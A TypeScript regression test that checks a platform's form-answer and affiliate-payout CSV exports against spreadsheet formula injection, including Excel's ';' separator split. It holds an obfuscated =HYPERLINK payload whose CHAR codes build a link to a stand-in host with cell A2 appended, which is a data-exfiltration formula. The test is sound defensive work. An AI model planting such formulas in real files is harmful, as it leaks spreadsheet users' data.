/**
 * R31 finding 2 (synthetic only): lib/csv.ts states the platform's one rule
 * for "a cell we write back into a spreadsheet": always quoted, and a leading
 * =, +, -, @ (after any spaces), tab or CR gets a ' in front. The form answers
 * export (lib/forms.ts safeCell, responsesCsv) and the affiliate payout files
 * (lib/affiliate-payouts.ts paypalCsv, worksheetCsv) must follow it.
 *
 * Why it matters: Excel opens a .csv with the system's list separator, which
 * is ";" in Brazil and most of Europe. An unquoted answer "Nice;=HYPERLINK(...)"
 * in the last column is then split at the ";", and the second cell starts with
 * "=": the leading-character check never saw it. A quoted cell keeps its ";"
 * inside, and a split leaves the stray closing quote, so no formula can run.
 *
 * The reader below is a plain RFC 4180 reader with a chosen separator, the way
 * such a spreadsheet reads the file.
 */
import { responsesCsv, safeCell, type FormDef } from "@/lib/forms";
import { paypalCsv, worksheetCsv, type BatchLine } from "@/lib/affiliate-payouts";
import type { Affiliate } from "@/lib/affiliates";
import { csvCell, csvLine } from "@/lib/csv";
import { plainAmount } from "@/lib/money";
import { done, is, part } from "./check";

function readWith(separator: string, text: string): string[][] {
  const rows: string[][] = [];
  let row: string[] = [];
  let cell = "";
  let quoted = false;
  let fresh = true;
  for (let i = 0; i < text.length; i += 1) {
    const c = text[i];
    if (quoted) {
      if (c === '"' && text[i + 1] === '"') { cell += '"'; i += 1; }
      else if (c === '"') quoted = false;
      else cell += c;
      continue;
    }
    if (c === '"' && fresh) { quoted = true; fresh = false; continue; }
    if (c === separator) { row.push(cell); cell = ""; fresh = true; continue; }
    if (c === "\r" || c === "\n") {
      if (c === "\r" && text[i + 1] === "\n") i += 1;
      row.push(cell); rows.push(row); row = []; cell = ""; fresh = true; continue;
    }
    cell += c;
    fresh = false;
  }
  if (cell || row.length) { row.push(cell); rows.push(row); }
  return rows;
}
// A cell a spreadsheet would run: it starts like a formula and its quotes are balanced.
const formulas = (rows: string[][]) => rows.flat().filter((v) => /^[=+\-@]/.test(v) && (v.match(/"/g) ?? []).length % 2 === 0);

const PAYLOAD = "Nice;=HYPERLINK(CHAR(104)&CHAR(116)&CHAR(116)&CHAR(112)&CHAR(58)&CHAR(47)&CHAR(47)&CHAR(101)&CHAR(46)&CHAR(120)&A2)";
const SAMPLES = ["plain", "Nice;=1+1", "  =1+1", "=SUM(A1)", "+1", "-3", "@x", "\tx", "\rx", 'says "hi", twice', "two\nlines", ""];

async function main(): Promise<void> {
  part("Form answers: a visitor's answer in the creator's spreadsheet, opened with ; as the separator");
  const form = {
    id: "rthirtyone",
    name: "Feedback",
    fields: [{ id: "q1aaaa", type: "short", label: "What did you think?", required: true, options: [] }],
    button: "",
    doneHeading: "",
    doneBody: "",
    outcomes: [],
    offerList: false,
    updatedAt: 1_790_000_000,
  } as unknown as FormDef;
  const csv = responsesCsv(form, [{ at: 1_790_000_000, page: "", answers: { q1aaaa: PAYLOAD }, outcome: "", joined: false }]);
  is("no cell of the forms export reads as a formula with ; as separator", formulas(readWith(";", csv)), []);
  is("nor with , as separator", formulas(readWith(",", csv)), []);
  is("(control) read with , the answer comes back whole, as typed", readWith(",", csv)[1], ["2026-09-21T14:13:20.000Z", PAYLOAD]);
  is("(control) the header keeps its words and order", readWith(",", csv)[0], ["Sent", "What did you think?"]);
  is("safeCell is the platform's one cell rule (lib/csv.ts)", SAMPLES.map(safeCell), SAMPLES.map((s) => csvCell(s)));

  part("Affiliate payout files: every text cell follows the same rule");
  const affiliate = (email: string, code: string) => ({ email, code, paypal: "" }) as unknown as Affiliate;
  const lines: BatchLine[] = [
    { affiliate: affiliate("sara@example.com", "sara10"), cents: 3000 },
    { affiliate: affiliate("lee@example.com", "lee"), cents: 1250 },
  ];
  const note = `Affiliate commission from ${PAYLOAD}`;

  const usd = paypalCsv(lines, "usd", note);
  is("PayPal (USD): address, code and note are quoted; amount, currency and wallet stay as PayPal reads them",
    usd,
    lines.map((l) => [csvCell(l.affiliate.email), plainAmount(l.cents, "usd"), "USD", csvCell(l.affiliate.code), csvCell(note), "PAYPAL"].join(",")).join("\r\n") + "\r\n");
  const eur = paypalCsv(lines, "eur", note);
  is("(control) PayPal (EUR): the amount keeps its comma inside quotes, built apart",
    readWith(",", eur)[0].slice(1, 3),
    [plainAmount(3000, "eur").replace(".", ","), "EUR"]);
  is("no cell of the PayPal file reads as a formula with ; or , as separator", [formulas(readWith(";", usd)), formulas(readWith(",", usd))], [[], []]);
  is("(control) read with , the PayPal file keeps six columns per row", readWith(",", usd).map((r) => r.length), [6, 6]);

  const sheet = worksheetCsv(lines, "usd", note);
  const header = ["name", "email", "amount", "sourceCurrency", "targetCurrency", "amountCurrency", "paymentReference", "affiliate_code"];
  is("worksheet: every cell is the platform's one cell rule",
    sheet,
    [csvLine(header), ...lines.map((l) => csvLine(["", l.affiliate.email, plainAmount(l.cents, "usd"), "USD", "USD", "source", note, l.affiliate.code]))].join("\r\n") + "\r\n");
  is("no cell of the worksheet reads as a formula with ; or , as separator", [formulas(readWith(";", sheet)), formulas(readWith(",", sheet))], [[], []]);
  is("(control) read with , the worksheet header keeps its words and order", readWith(",", sheet)[0], header);

  done();
}

main().catch((error) => {
  console.error(error);
  process.exit(1);
});
